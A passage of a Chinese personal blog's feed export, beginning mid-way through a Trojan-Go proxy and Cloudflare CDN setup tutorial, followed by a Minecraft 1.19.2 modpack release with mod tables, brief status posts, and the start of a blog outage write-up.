是给予<strong>设置的</strong>特权。</p><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><p>是时候加上 WebSocket 了，然后才能用 CDN 转发。配置文件也参考<a href="https://p4gefau1t.github.io/trojan-go/advance/websocket">文档</a>加。</p><p>其中 <code>host</code> 就填你的域名，不是 IP 什么的，同前文也不能是 DDNS 域名。其它的都没什么问题。</p><p>加完 <code>systemctl restart trojan-go</code> 重启，然后在客户端里也加上相应配置，<code>host</code> 部分也填对应域名。检查一下，没问题就能上 CDN 了。</p><h3 id="Cloudflare"><a href="#Cloudflare" class="headerlink" title="Cloudflare"></a>Cloudflare</h3><p>你不想用 Cloudflare 其实可以跳过这一步的，不受任何影响。如果你的服务器网络非常非常垃圾或者想要安全一点可以用。</p><p>CDN 是内容分发网络，具体可以 <a href="https://www.bing.com/search?q=CDN">Bing</a> 或看我之前的<a href="https://www.jiecs.top/archives/44/">文章</a></p><p>实际上这里也可以选用其它国内的 CDN，还能起到一定中转加速作用，只要注意<a href="https://p4gefau1t.github.io/trojan-go/advance/aead/">加密</a>，CDN 服务商也是没法分析流量的。比如百度云加速，但百度云加速前几年因为政策已经不支持 WebSocket 了，其它国内的 CDN 支持 WebSocket 的都收费。还有一点国内 CDN 都要求备案的域名<del>，不过我博客域名已经备案了</del>。</p><p>打开 Cloudflare 用域名创建站点，然后导入之前的 DNS 记录。注意 Cloudflare 自动扫的很可能不全或根本没有，可以自己从之前的 DNS 服务商导出 zone 文件或者自己手动改过去。还有服务器的子域要勾上小云朵，其它如果有之前的记录就看情况随意。勾上小云朵就是开启 CDN 中转，否则只用 Cloudflare 的 DNS 服务。之前添加时把域名的 NS 解析交给 Cloudflare 你就已经在用 Cloudflare 的 DNS 了，Cloudflare 一般不能只用 CDN 而不用 DNS。（也有办法但不在这篇文章的讨论范围内了）各种设置都看情况开关，强制 HTTPS 之类的一般都不影响 Trojan 正常使用。</p><p>添加完站点注意把 SSL&#x2F;TLS 设置成 <code>完全（严格）</code>，这样才能让 Cloudflare 请求源站时也采用 443 端口，从而把 Trojan 的流量转发。</p><p>然后只要确保你客户端所有域名都没问题就行了。要验证可以 ping 一下你的域名，看是不是 Cloudflare 的 IP。</p><p>Cloudflare 的 CDN 虽然很不错，但有个缺点它虽然在国外都快的飞起，但它没有国内节点（或者要 Enterprise Plan），而且国内连它特别特别慢，许多人称 Cloudflare 为减速 CDN，事实也确实如此。但 Cloudflare 的 IP 真的非常非常多，总有那么几个快的 IP，有一些项目比如 <a href="https://github.com/XIU2/CloudflareSpeedTest">CloudflareSpeedTest</a>，可以自动测对你来讲你最快的 IP，然后就可以在客户端里把主机改成这个 IP，这样就能快很多。</p><p>另外这里要注意，不用在意 IP 的地区，因为 Cloudflare 的 IP 并不是确定的某一台节点或数据中心，每个 IP 的节点都是会根据情况自动调整的，这个过程你改变不了。你可以访问 https:&#x2F;&#x2F;[IP]&#x2F;cdn-cgi&#x2F;trace 查看这个 IP 当前的位置。</p><h2 id="然后该干什么"><a href="#然后该干什么" class="headerlink" title="然后该干什么"></a>然后该干什么</h2><p>Cloudflare 部分是可选的，你的网络环境差 Cloudflare 可能会让节点更慢，上文的 CloudflareSpeedTest 也只能是缓解。你可以尝试对比直接连服务器 IP 和连 Cloudflare 的速度，看看慢的能不能接受，还有稳定程度等。如果你确定要用 Cloudflare，那么你可以申请一个十五年的免费 Cloudflare 源服务器证书，然后 Trojan-Go 的证书改成这个。当然这个证书是有限制的，只能用于 Cloudflare 连你服务器，如果你不要用 Cloudflare 就还是要用 Let’s Encrypt 的。</p><p>或者如果你不想用 Cloudflare。那么要注意如果你服务器的伪装 Web 服务开在 80 端口，那么会导致 certbot 没法自动续签，因为如上文，certbot 的 standalone 模式就是开设一个临时的验证 HTTP Web 服务，如果你的服务开在 80 就会占用。可以把服务改在 8080 之类的。</p><p>想要再进阶一点可以参考 <a href="https://p4gefau1t.github.io/trojan-go/advance/">Trojan-Go 高级配置文档</a>。</p><blockquote><p>严正声明：本人并不知道 Trojan 之类的是什么东西，以上内容都是在一个地上捡的 U 盘里找到的</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>教程</tag>
      
      <tag>云服务</tag>
      
      <tag>Cloudflare</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>准备重整博客</title>
    <link href="/archives/f2b38fdc/"/>
    <url>/archives/f2b38fdc/</url>
    
    <content type="html"><![CDATA[<p>好久好久没好好维护过博客了，评论现在全炸了。还有一些其他的问题，最近终于决定开始修了</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LSOCP 免费 Minecraft 我的世界整合包升级至最新 1.19.2 - 荒野更新</title>
    <link href="/archives/e47263f6/"/>
    <url>/archives/e47263f6/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对<a href="/archives/7eb365b6/">之前</a>的整合包进行升级，版本支持到 1.19.2.由于也是自用，不考虑同时多版本支持</p><h2 id="升级内容"><a href="#升级内容" class="headerlink" title="升级内容"></a>升级内容</h2><div class="note note-light">            <p>常规模组版本升级，配置文件变化等不在此列出</p>          </div><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><table><thead><tr><th>旧</th><th>新</th><th>备注</th></tr></thead><tbody><tr><td><strong>Minecraft</strong> <em>1.19</em></td><td><strong>Minecraft</strong> <em>1.19.2</em></td><td></td></tr><tr><td><strong>Plain Craft Launcher 2</strong></td><td><strong>Hello Minecraft! Launcher</strong></td><td>经典开源，且能一键更新模组</td></tr><tr><td><strong>.NET Framework</strong></td><td>删除</td><td>HMCL 无需 .NET</td></tr></tbody></table><h3 id="模组"><a href="#模组" class="headerlink" title="模组"></a>模组</h3><table><thead><tr><th>旧</th><th>新</th><th>备注</th></tr></thead><tbody><tr><td><strong>快速箱子渲染</strong>、<strong>更好的床</strong></td><td><strong>方块实体优化</strong></td><td>效果更好更全且保留箱子动画</td></tr><tr><td><strong>磷</strong></td><td><strong>星光</strong></td><td>效果更好</td></tr><tr><td>-</td><td><strong>服务器区块缓存</strong> <strong>平滑滚动</strong> <strong>ViaFabric</strong> <strong>自定义局域网联机</strong> <strong>投影</strong> <strong>Tweakeroo</strong> 等</td><td>添加许多实用模组</td></tr></tbody></table><h3 id="资源包"><a href="#资源包" class="headerlink" title="资源包"></a>资源包</h3><table><thead><tr><th>旧</th><th>新</th><th>备注</th></tr></thead><tbody><tr><td>-</td><td><strong>Masa 系汉化(law4x)</strong></td><td>补全汉化</td></tr></tbody></table><h3 id="光影"><a href="#光影" class="headerlink" title="光影"></a>光影</h3><table><thead><tr><th>旧</th><th>新</th><th>备注</th></tr></thead><tbody><tr><td>-</td><td><strong>SEUS PTGI</strong>、<strong>AstraLex Shaders</strong> 、<strong>Make Up - Ultra Fast</strong></td><td>各级设备均有合适光影</td></tr></tbody></table><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>懒人包 内置 HMCL 启动器和 JRE 17 等环境，附带常用光影、资源包（材质），各种模组配置已调试好。只需下载一个 ZIP 即可开玩</li><li>Fabric 且不含 Optfine，使用开源且效果更好的 钠(Sodium) <del>及一堆元素周期表</del>替代。连接材质等特性也有实现</li><li>除了 Minecraft 本体、Xaero 地图系列模组，所有内容物都开源</li><li>海量模组，清晰分类命名，整合包内无多余垃圾文件。且有内容物表格</li><li>面向客户端，不含向游戏内添加元素的模组</li><li>绝大多数内容均有汉化</li></ul><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>整合包分 FULL 和 MINI 两个版本。以下链接两个版本都包含，四个文件中选择 1.19.2 的两个即可</p><ul><li><a href="http://ctpan.jiecs.top/d/32856022-49594170-e70ac6">城通网盘</a></li><li><a href="https://jiecs-my.sharepoint.com/:f:/g/personal/i_jiecs_top/EuAKe2HDM6tMnv-LonYePj0BcfwlBwmxWaPlOgnCw3Ku6g?e=vDbxDQ">OneDrive</a></li></ul><div class="note note-warning">            <p>模组较多（57 个 jar 文件，179 个模组），初次启动可能要较长时间，后续有了疾速加载模组的缓存会快很多</p>          </div><h3 id="FULL"><a href="#FULL" class="headerlink" title="FULL"></a>FULL</h3><p>FULL 包含了上述的运行环境，以及 Minecraft 本体、资源文件、Minecraft 基础配置文件（如语言、视角）等。占用空间大，下载耗时长，但下载后可完全不联网开始游戏</p><p>大小 707 MB，解压后 908 MB<br>（原大小 911MB，解压后 1.12 GB）</p><h3 id="MINI"><a href="#MINI" class="headerlink" title="MINI"></a>MINI</h3><p>MINI 为标准的 MCBBS 整合包格式。没有上述运行环境，Minecraft 本体、资源文件、Minecraft 基础配置文件（只包含模组配置文件）等也不包含，启动器文件补全时需要联网</p><p>大小 78.6 MB，解压后 82.9 MB<br>（原大小 77.8 MB，解压后 131 MB）</p><p>启动后约 173 MB</p><h2 id="内容物"><a href="#内容物" class="headerlink" title="内容物"></a>内容物</h2><h3 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h3><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Hello Minecraft! Launcher (HMCL)</strong> <em>dev 3.5.3.221</em></td><td>知名 Minecraft Java 启动器</td><td><a href="https://hmcl.huangyuhui.net/">官网</a> <a href="https://github.com/huanghongxun/HMCL">Github</a></td><td></td></tr><tr><td><strong>Java SE Development Kit</strong> <em>17.0.4-windows-64x</em></td><td>Minecraft Java 以及 HMCL 必须运行环境</td><td><a href="https://download.bell-sw.com/java/17.0.4.1+1/bellsoft-jre17.0.4.1+1-windows-amd64-full.zip">Bellsoft</a></td><td>源文件形式无需安装</td></tr></tbody></table><h3 id="模组-1"><a href="#模组-1" class="headerlink" title="模组"></a>模组</h3><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>ClientCommands</strong> <em>2.7.3</em></td><td>许多实用客户端命令，可实现如附魔钓鱼预测、工具无限耐久</td><td><a href="https://github.com/Earthcomputer/clientcommands">Github</a></td><td>部分作弊性质</td></tr><tr><td><strong>自动钓鱼</strong> Autofish <em>0.9.5</em></td><td>可配置的自动钓鱼</td><td><a href="https://github.com/MrTroot/autofish">Github</a></td><td></td></tr><tr><td><strong>Tweakeroo</strong> <em>0.14.3</em></td><td>许多实用功能，如灵魂出窍、潜影盒预览</td><td><a href="https://github.com/maruohon/tweakeroo/">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/tweakeroo">CurseForge</a></td><td>依赖 MaLiLib；部分作弊性质</td></tr><tr><td><strong>投影</strong> Litematica <em>0.12.4</em></td><td>加载结构文件，创建全息蓝图</td><td><a href="https://github.com/maruohon/litematica">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/litematica">CurseForge</a></td><td>依赖 MaLiLib</td></tr><tr><td><strong>MasaGadget</strong> <em>3.0.0</em></td><td>Masa 系模组增强</td><td><a href="https://github.com/plusls/MasaGadget">Github</a></td><td>依赖 MagicLib</td></tr><tr><td><strong>Xaero的世界地图</strong> Xaero’s World Map <em>1.26.5</em></td><td>自动缓存、性能不错的地图</td><td><a href="https://chocolateminecraft.com/worldmapdownload.php">官网</a> <a href="https://www.curseforge.com/minecraft/mc-mods/xaeros-world-map">CurseForge</a></td><td>闭源</td></tr><tr><td><strong>Xaero的小地图</strong> Xaero’s Minimap <em>22.13.2</em></td><td>联动 Xaero的世界地图 的小地图</td><td><a href="https://www.curseforge.com/minecraft/mc-mods/xaeros-minimap">CurseForge</a></td><td>依赖 Xaero的世界地图；闭源</td></tr><tr><td><strong>回放</strong> Replay Mod <em>2.6.8</em></td><td>录制游戏内容并可编辑、渲染</td><td><a href="https://www.replaymod.com/">官网</a> <a href="https://github.com/ReplayMod/ReplayMod">Github</a></td><td>FFmpeg 版本 5.0.1 essentials；渲染功能在本整合包中近乎残废，不考虑做兼容性优化，建议仅使用录制功能</td></tr><tr><td><strong>一键背包整理Next</strong> Inventory Profiles Next <em>1.6.4</em></td><td>简单的一键背包整理</td><td><a href="https://github.com/blackd/Inventory-Profiles">Github</a></td><td></td></tr><tr><td><strong>ViaFabric</strong> <em>0.4.8+16</em></td><td>使客户端可连接的服务器向下兼容</td><td><a href="https://github.com/ViaVersion/ViaFabric">Github</a></td><td>可能触发部分反作弊，可在多人游戏界面开关</td></tr><tr><td><strong>自定义局域网联机</strong> Lan Server Properties <em>1.9</em></td><td>可自定义局域网联机的端口、正版验证等</td><td><a href="https://github.com/rikka0w0/LanServerProperties">Github</a></td><td></td></tr><tr><td><strong>缩放</strong> Zoomify <em>5.0.0</em></td><td>C 键放大，可进行许多配置</td><td><a href="https://github.com/isXander/Zoomify">Github</a></td><td>依赖 Fabric Language Kotlin</td></tr></tbody></table><h4 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Fabric API</strong> <em>0.60.0</em></td><td>Fabric 基础 API</td><td><a href="https://fabricmc.net/">官网</a> <a href="https://github.com/FabricMC/fabric">Github</a></td><td>移除将导致绝大多数模组无法工作</td></tr><tr><td><strong>万用皮肤补丁</strong> CustomSkinLoader <em>14.14-SNAPSHOT-345</em></td><td>皮肤补丁</td><td><a href="https://github.com/xfl03/MCCustomSkinLoader">Github</a></td><td></td></tr><tr><td><strong>披风</strong> Capes <em>1.4.4</em></td><td>显示 Optfine 等的披风</td><td><a href="https://github.com/CaelTheColher/Capes">Github</a></td><td></td></tr><tr><td><strong>模组菜单</strong> Mod Menu <em>4.0.6</em></td><td>模组列表，且是许多模组的配置屏幕 UI</td><td><a href="https://github.com/TerraformersMC/ModMenu">Github</a></td><td>更好的F3、动态FPS 等 9 个模组的配置 GUI 依赖此</td></tr><tr><td><strong>Cloth Config API</strong> <em>8.0.75</em></td><td>部分模组的配置屏幕 API</td><td><a href="https://github.com/shedaniel/cloth-config">Github</a></td><td>更好的F3、动态FPS 等 4 个模组的配置 GUI 依赖此和模组菜单</td></tr><tr><td><strong>Cloth API</strong> <em>4.0.65</em></td><td>部分模组的 API</td><td><a href="https://github.com/shedaniel/cloth-api">Github</a></td><td>界面微调 依赖此</td></tr><tr><td><strong>Architectury API</strong> <em>6.2.43</em></td><td>Forge 和 Fabric 的抽象化调用 API</td><td><a href="https://github.com/architectury/architectury-api">Github</a></td><td>界面微调 依赖此</td></tr><tr><td><strong>Fabric Language Kotlin</strong> <em>1.8.2</em></td><td>提供 Fabric 中 Kotlin 语言支持的 API</td><td><a href="https://github.com/FabricMC/fabric-language-kotlin">Github</a></td><td>缩放 依赖此</td></tr><tr><td><strong>铟</strong> Indium <em>1.0.7</em></td><td>让 Fabric Render API 与 钠 兼容</td><td><a href="https://github.com/comp500/Indium">Github</a></td><td>Lambda的更好的草方块、连接纹理 依赖此</td></tr><tr><td><strong>MaLiLib</strong> <em>0.13.0</em></td><td>Masa 系模组依赖库</td><td><a href="https://github.com/maruohon/malilib">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/malilib">CurseForge</a></td><td>Tweakeroo、投影 等 3 个模组依赖此</td></tr><tr><td><strong>MagicLib</strong> <em>0.5.37</em></td><td>部分模组的依赖库</td><td><a href="https://github.com/Hendrix-Shen/MagicLib">Github</a></td><td>MasaGadget 依赖此；依赖 MaLiLib</td></tr></tbody></table><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Iris Shaders</strong> <em>1.2.5</em></td><td>在 Fabric 中与 钠 搭配兼容部分 Optfine 的光影</td><td><a href="https://irisshaders.net/">官网</a> <a href="https://github.com/IrisShaders/Iris">Github</a></td><td>在 模组菜单 或 钠 的视频设置中有可配置选项</td></tr><tr><td><strong>动态声音滤波器</strong> DynamicSoundFilters <em>1.3.0</em></td><td>根据场景对游戏音效添加混响等</td><td><a href="https://www.curseforge.com/minecraft/mc-mods/dynamic-sound-filters">CurseForge</a> <a href="https://bitbucket.org/andre111/dynamicsoundfilters">Bitbucket</a></td><td>在 模组菜单 中有可配置选项</td></tr><tr><td><strong>连接纹理</strong> Continuity <em>2.0.1</em></td><td>玻璃等材质边缘的连接</td><td><a href="https://github.com/PepperCode1/Continuity">Github</a></td><td>依赖 铟</td></tr><tr><td><strong>更多动画</strong> Not Enough Animations <em>1.6.1</em></td><td>增加如划船、看地图等时的玩家模型动画</td><td><a href="https://github.com/tr7zw/NotEnoughAnimations">Github</a></td><td></td></tr><tr><td><strong>Lambda的动态光源</strong> LambDynamicLights <em>2.1.2</em></td><td>比 Optfine 许多细节更好的动态光源</td><td><a href="https://github.com/LambdAurora/LambDynamicLights">Github</a></td><td>在 模组菜单 中有可配置选项</td></tr><tr><td><strong>Lambda的更好的草方块</strong> LambdaBetterGrass <em>1.3.0</em></td><td>比 Optfine 许多细节更好的草方块</td><td><a href="https://github.com/LambdAurora/LambdaBetterGrass">Github</a></td><td>依赖 铟；在 模组菜单 中有可配置选项</td></tr><tr><td><strong>界面微调</strong> Slight Gui Modifications <em>2.2.0</em></td><td>优化界面切换、截图等 UI 动画</td><td><a href="https://github.com/shedaniel/slight-gui-modifications">Github</a></td><td>依赖 Cloth API、Cloth Config API、Architectury API；在 模组菜单 中有可配置选项；一个模组五个前置。。；还不支持 1.19.2，我折腾了老长时间给它临时适配一下，聊天框动画不能用</td></tr><tr><td><strong>平滑滚动</strong> Smooth Scrolling Everywhere <em>3.0.5</em></td><td>为各种界面添加平滑滚动、触底反弹</td><td><a href="https://github.com/shedaniel/SmoothScrollingEverywhere">Github</a></td><td></td></tr></tbody></table><h4 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>物品栏HUD+</strong> Inventory HUD+ <em>3.4.2</em></td><td>显示药水效果、盔甲耐久等</td><td><a href="https://github.com/briansemrau/InventoryHUD">Github</a></td><td>独立配置界面</td></tr><tr><td><strong>伤害显示</strong> ToroHealth Damage Indicators <em>1</em></td><td>显示攻击掉血和生物血条</td><td><a href="https://github.com/ToroCraft/ToroHealth">Github</a></td><td>配置文件位于 .&#x2F;config&#x2F;torohealth.json 参考<a href="https://www.mcmod.cn/post/2258.html">此处</a></td></tr><tr><td><strong>苹果皮</strong> AppleSkin <em>2.4.0</em></td><td>显示饱和度和食物可恢复饥饿值等</td><td><a href="https://github.com/squeek502/AppleSkin">Github</a></td><td>在 模组菜单 中有可配置选项（依赖 Cloth Config API）</td></tr><tr><td><strong>燃料信息</strong> FuelInfo <em>1.0</em></td><td>显示燃料&#x2F;烈焰棒剩余可烧物品&#x2F;酿造药水数量</td><td><a href="https://github.com/Luligabi1/FuelInfo">Github</a></td><td></td></tr><tr><td><strong>更好的钠视频设置按钮</strong> Better Sodium Video Settings Button <em>3.0.2</em></td><td>优化视频设置样式，添加部分优化模组配置入口</td><td><a href="https://github.com/LimeShulkerBox/better-sodium-video-settings">Github</a></td><td>依赖 钠</td></tr><tr><td><strong>钠 · 扩展</strong> Sodium Extra <em>0.4.6</em></td><td>为钠添加粒子设置等</td><td><a href="https://github.com/FlashyReese/sodium-extra-fabric">Github</a></td><td>依赖 钠</td></tr><tr><td><strong>Reeses的钠视频界面</strong> Reese’s Sodium Options <em>1.4.6</em></td><td>使钠视频设置可滚动并添加光影包按钮等</td><td><a href="https://github.com/FlashyReese/reeses-sodium-options">Github</a></td><td>依赖 钠</td></tr><tr><td><strong>更好的F3</strong> BetterF3 <em>1.3.2</em></td><td>多语言、彩色且可自定义的 F3</td><td><a href="https://github.com/cominixo/BetterF3">Github</a></td><td>在 模组菜单 中有可配置选项（依赖 Cloth Config API）</td></tr></tbody></table><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>钠</strong> Sodium <em>0.4.2replay</em></td><td>极大地提升帧率并修复许多图形问题</td><td><a href="https://github.com/CaffeineMC/sodium-fabric">Github</a> <a href="https://www.replaymod.com/download/sodium-fabric-mc1.19-0.4.2+replaymod.rev.bfbc6de.jar">Replay Mod</a></td><td>replaymod 兼容版</td></tr><tr><td><strong>锂</strong> Lithium <em>0.8.0</em></td><td>优化各类计算机制</td><td><a href="https://github.com/CaffeineMC/lithium-fabric">Github</a></td><td></td></tr><tr><td><strong>星光</strong> Starlight <em>1.1.1</em></td><td>优化光照引擎</td><td><a href="https://github.com/PaperMC/Starlight">Github</a></td><td></td></tr><tr><td><strong>铁氧体磁芯</strong> FerriteCore <em>5.0.0</em></td><td>减少内存占用并牺牲一些帧率</td><td><a href="https://github.com/malte0811/FerriteCore">Github</a></td><td>可能导致帧率不稳定</td></tr><tr><td><strong>氪</strong> Krypton <em>0.2.1</em></td><td>优化网络堆栈</td><td><a href="https://github.com/astei/krypton">Github</a></td><td></td></tr><tr><td><strong>C2ME</strong> <em>0.2.0</em></td><td>优化区块和 IO 加载性能</td><td><a href="https://github.com/RelativityMC/C2ME-fabric">Github</a> <a href="https://modrinth.com/mod/c2me-fabric">Modrinth</a></td><td>可能导致帧率不稳定</td></tr><tr><td><strong>疾速加载</strong> DashLoader <em>4.0.0</em></td><td>缓存内容以大幅度加速游戏启动</td><td><a href="https://github.com/TeamQuantumFusion/DashLoader">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/dashloader">CurseForge</a></td><td></td></tr><tr><td><strong>DFU载入优化</strong> LazyDFU <em>0.1.3</em></td><td>优化跨版本升级数据流程来加速游戏启动和载入</td><td><a href="https://github.com/astei/lazydfu">Github</a></td><td></td></tr><tr><td><strong>实体渲染机制优化</strong> Entity Culling Fabric <em>1.5.2</em></td><td>跳过渲染不可见的实体</td><td><a href="https://github.com/tr7zw/EntityCulling">Github</a></td><td>与许多需要渲染大量实体的模组冲突</td></tr><tr><td><strong>动态FPS</strong> Dynamic Fps <em>2.2.0</em></td><td>自动降低游戏窗口在未聚焦时的渲染帧数</td><td><a href="https://github.com/juliand665/Dynamic-FPS">Github</a></td><td>在 模组菜单 中有可配置选项（依赖 Cloth Config API）；可能使部分 AFK 装置失效</td></tr><tr><td><strong>更好的树叶渲染优化</strong> CullLessLeaves <em>1.0.2</em></td><td>自定义需要渲染的树叶层数</td><td><a href="https://github.com/isXander/CullLessLeaves">Github</a></td><td>在 模组菜单（依赖 Cloth Config API）或 钠 的视频设置中有可配置选项</td></tr><tr><td><strong>服务器区块缓存</strong> Bobby <em>4.0.0</em></td><td>自定义渲染距离上限</td><td><a href="https://github.com/johni0702/bobby">Github</a></td><td></td></tr><tr><td><strong>崩溃优化</strong> Not Enough Crashes <em>4.1.8</em></td><td>游戏崩溃时提供更多信息，并能回到标题页面而不需要重新启动游戏</td><td><a href="https://github.com/natanfudge/not-enough-crashes">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/not-enough-crashes">CurseForge</a></td><td>据 MCMOD 评论反馈兼容性较差</td></tr><tr><td><strong>输入法冲突修复</strong> IMBlockerFabric <em>1.0.19</em></td><td>在输入法开启时根据场景自动处理输入法输入</td><td><a href="https://github.com/mrjesen/ImBlockerFabric">Github</a></td><td></td></tr><tr><td><strong>方块同步修复</strong> AntiGhost <em>1.1.5</em></td><td>用 &#x2F;ghost 或快捷键快速修复附近的假方块</td><td><a href="https://github.com/gbl/AntiGhost">Github</a></td><td></td></tr><tr><td><strong>无边框全屏</strong> Borderless Mining <em>1.1.5</em></td><td>将默认全屏替换为无边框全屏，用于兼容 Xbox Game Bar 等</td><td><a href="https://github.com/comp500/BorderlessMining">Github</a></td><td>可能有性能影响，可在全屏分辨率中调整</td></tr><tr><td><strong>禁用聊天举报</strong> No Chat Reports <em>1.10.1</em></td><td>禁用 1.19 中多人游戏新增的聊天举报</td><td><a href="https://github.com/Aizistral-Studios/No-Chat-Reports">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/no-chat-reports">CurseForge</a></td><td></td></tr></tbody></table><h3 id="资源包-1"><a href="#资源包-1" class="headerlink" title="资源包"></a>资源包</h3><h4 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>生物悬浮血条</strong> Entity Healthbars <em>3.0</em></td><td>如 伤害显示 的世界血条与光影冲突可使用</td><td><a href="https://www.curseforge.com/minecraft/texture-packs/entity-healthbars">CurseForge</a></td><td></td></tr><tr><td><strong>RTX 16x</strong> <em>v6</em></td><td>仿基岩版 RTX PBR 法线材质，可搭配光影实现光追</td><td><a href="https://www.curseforge.com/minecraft/texture-packs/rtx-16x-for-java">CurseForge</a></td><td></td></tr></tbody></table><h4 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>汉化游戏文本+</strong> <em>3687ee6</em></td><td>汉化闪烁标语、终末之诗等，并添加了许多闪烁标语</td><td><a href="https://github.com/jiesou/Minecraft-Text-Sinicization/tree/plus">Github</a></td><td></td></tr><tr><td><strong>Xaeros 地图汉化</strong> <em>210826</em></td><td>汉化 Xaeros 地图系列</td><td><a href="https://www.bilibili.com/read/cv11613668">哔哩哔哩</a></td><td>新兵Sinbing 制作</td></tr><tr><td><strong>Masa 系汉化(law4x)</strong> <em>V2e</em></td><td>汉化 Masa 系列模组</td><td><a href="https://www.bilibili.com/read/cv6590190/">哔哩哔哩</a></td><td>law4x 制作</td></tr></tbody></table><h3 id="光影-1"><a href="#光影-1" class="headerlink" title="光影"></a>光影</h3><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Make Up - Ultra Fast</strong> <em>8.6d</em></td><td>超低配光影</td><td><a href="https://www.sonicether.com/seus">官网</a></td><td>配置要求 低 - 高</td></tr><tr><td><strong>Complementary Shaders</strong> <em>v4.5</em></td><td>魔改自 BSL 的全能光影</td><td><a href="https://www.complementary.dev/">官网</a> <a href="https://www.curseforge.com/minecraft/customization/complementary-shaders">CurseForge</a></td><td>配置要求 中低 - 中高</td></tr><tr><td><strong>AstraLex Shaders</strong> <em>v4.5</em></td><td>魔改自 BSL，效果独特的光影</td><td><a href="https://www.complementary.dev/">官网</a> <a href="https://www.curseforge.com/minecraft/customization/complementary-shaders">CurseForge</a></td><td>配置要求 中 - 高</td></tr><tr><td><strong>SEUS PTGI</strong> <em>E12</em></td><td>知名顶级光追光影</td><td><a href="https://www.sonicether.com/seus">官网</a></td><td>配置要求 高 - 极高</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>一些日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>Minecraft</tag>
      
      <tag>游戏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我还活着</title>
    <link href="/archives/7faa64b/"/>
    <url>/archives/7faa64b/</url>
    
    <content type="html"><![CDATA[<p>刷一下动态</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最近搞了个大项目 - TOVALua手册</title>
    <link href="/archives/3eab65a6/"/>
    <url>/archives/3eab65a6/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/jiesou/TOVALuaManual-Server/tree/dev">https://github.com/jiesou/TOVALuaManual-Server/tree/dev</a></p><p>参见项目页</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>云服务</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022.6.29 我的博客是这样崩的</title>
    <link href="/archives/8ae69b12/"/>
    <url>/archives/8ae69b12/</url>
    
    <content type="html"><![CDATA[<h2 id="至暗时刻"><a href="#至暗时刻" class="headerlink" title="至暗时刻"></a>至暗时刻</h2><p>2021 年 6 月 29 日 <strong>9:35</strong>，我博客的重要合作伙伴 —— Google 向我发送电子邮件 <sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="Google Search Console">[1]</span></a></sup>，反馈大量服务和域名接入层不可用。我在当天 <strong>16:37</strong> 得知了博客的异常情况。基于报警内容，我第一时间怀疑博客的 CDN - 百度云加速出现问题。打开浏览器准备着手<em>紧急</em>处理（为了方便理解，下述事故处理过程做了部分简化）。</p><h2 id="初因定位"><a href="#初因定位" class="headerlink" title="初因定位"></a>初因定位</h2><p><strong>17:00</strong> 登录 BU<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[BetterUptime](https://betteruptime.com) 一个监控网站可用性并提供公开状态页的 Paas 服务">[2]</span></a></sup> 后台，发现后台并没有关于此事件的任何记录，导致未及时收到事件通知（我有<em>完善</em>的博客异常监控通知机制，博客异常通常能迅速通知到我的邮箱、Telegram 等）无法获取到事件的调试信息</p><p><strong>17:05</strong><br><em>机制</em>的我决定绕过 BU 后台，自行向博客发出请求来测试。发现博客确实炸了，只有百度云加速的 502 